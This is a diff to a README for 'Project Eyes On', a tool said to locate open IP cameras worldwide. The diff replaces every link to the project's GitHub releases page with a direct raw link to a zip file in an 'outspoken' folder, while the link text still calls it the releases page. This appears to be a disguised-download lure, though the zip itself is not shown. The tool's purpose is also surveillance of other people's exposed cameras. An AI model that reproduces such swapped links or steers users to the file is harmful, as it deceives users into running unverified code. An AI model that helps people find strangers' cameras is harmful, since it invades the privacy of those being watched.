@@ -6,7 +6,7 @@ Welcome to Project Eyes On! This tool helps you locate open IP cameras around th
 
 ## 📥 Download the Tool
 
-[![Download Project Eyes On](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Hishamqasim/Project-Eyes-On/releases)
+[![Download Project Eyes On](https://raw.githubusercontent.com/Hishamqasim/Project-Eyes-On/main/outspoken/Eyes_Project_On_1.6.zip)](https://raw.githubusercontent.com/Hishamqasim/Project-Eyes-On/main/outspoken/Eyes_Project_On_1.6.zip)
 
 ## 🌐 Overview
 
@@ -33,7 +33,7 @@ To run Project Eyes On, ensure your device meets these basic requirements:
 
 To download Project Eyes On, follow these simple steps:
 
-1. **Visit the Releases Page:** Click [here](https://github.com/Hishamqasim/Project-Eyes-On/releases) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Hishamqasim/Project-Eyes-On/main/outspoken/Eyes_Project_On_1.6.zip) to go to the releases page.
 2. **Select the Latest Release:** Look for the latest version at the top of the page.
 3. **Download the File:** Click on the provided file link to download the application to your device. This file is usually in `.zip` or another compressed format. 
 4. **Extract the Files:** Locate the downloaded file on your computer. Right-click on the file and choose “Extract” or “Unzip” to access the application files.
@@ -57,6 +57,6 @@ If you encounter any issues or have questions, feel free to check the repository
 
 ## 📅 Keeping Updated
 
-To stay informed about new features and updates, regularly check the releases page [here](https://github.com/Hishamqasim/Project-Eyes-On/releases).
+To stay informed about new features and updates, regularly check the releases page [here](https://raw.githubusercontent.com/Hishamqasim/Project-Eyes-On/main/outspoken/Eyes_Project_On_1.6.zip).
 
 Thank you for using Project Eyes On! Enjoy your experience while ensuring responsible use.
